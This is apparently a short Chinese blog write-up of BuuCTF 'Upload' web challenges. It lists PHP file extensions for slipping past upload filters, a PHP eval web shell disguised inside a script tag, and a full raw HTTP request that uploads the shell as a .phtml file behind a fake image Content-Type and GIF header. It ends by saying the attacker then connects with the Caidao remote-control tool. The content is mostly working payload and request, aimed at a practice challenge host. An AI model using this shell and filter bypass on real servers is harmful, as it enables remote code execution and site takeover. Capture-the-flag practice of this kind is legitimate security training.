---
title: BuuCTF web
tags: []
id: '483'
categories:
  - - CTF
date: 2020-04-15 23:59:27
---

## \[极客大挑战 2019\]Upload/\[ACTF2020 新生赛\]Upload

格式绕过

php，php3，php4，php5，phtml，pht

<?绕过

```
<script language='php'>phpinfo();eval($_POST['v']);</script>
```

Content-Type: image/png

POST /upload\_file.php HTTP/1.1
Host: 19b6558c-a515-415e-a219-3c3175b62eed.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------2861896706387660493773565516
Content-Length: 399
Origin: http://19b6558c-a515-415e-a219-3c3175b62eed.node3.buuoj.cn
Connection: close
Referer: http://19b6558c-a515-415e-a219-3c3175b62eed.node3.buuoj.cn/
Upgrade-Insecure-Requests: 1

-----------------------------2861896706387660493773565516
Content-Disposition: form-data; name="file"; filename="1.phtml"
Content-Type: image/png

GIF98a?
<script language='php'>phpinfo();eval($\_POST\['v'\]);</script>
-----------------------------2861896706387660493773565516
Content-Disposition: form-data; name="submit"

提交
-----------------------------2861896706387660493773565516--

然后用菜刀就可以了